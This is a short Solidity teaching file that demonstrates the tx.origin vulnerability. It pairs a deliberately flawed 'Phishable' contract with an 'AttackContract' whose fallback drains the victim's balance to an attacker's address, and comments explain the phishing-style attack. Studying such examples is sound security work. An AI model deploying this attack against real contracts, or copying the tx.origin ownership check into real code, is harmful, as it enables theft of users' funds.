//SPDX-License-Identifier:MIT
pragma solidity ^0.8.11;

// sources - https://solidity-by-example.org/ , https://blog.sigmaprime.io/solidity-security.html#delegatecall
//tx.origin - traverses the entire call stack and returns the address of the account that originally sent the call 
//  contract vulnerable to a phishing-like attack
// if the owner gets tricked to send some ether toh the AttackContract , it will invoke thw fallback function
// which further calls the withdrawAll function. Since tx.origin is still the owner , all checks passes
// and the contract balance gets emptied to the AttackContract. 

contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    fallback () external payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        payable(_recipient).transfer(address(this).balance);
    }
}

contract AttackContract {

    Phishable phishableContract;
    address attacker; // The attackers address to receive funds.

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    fallback () external payable {
        phishableContract.withdrawAll(attacker);
    }
}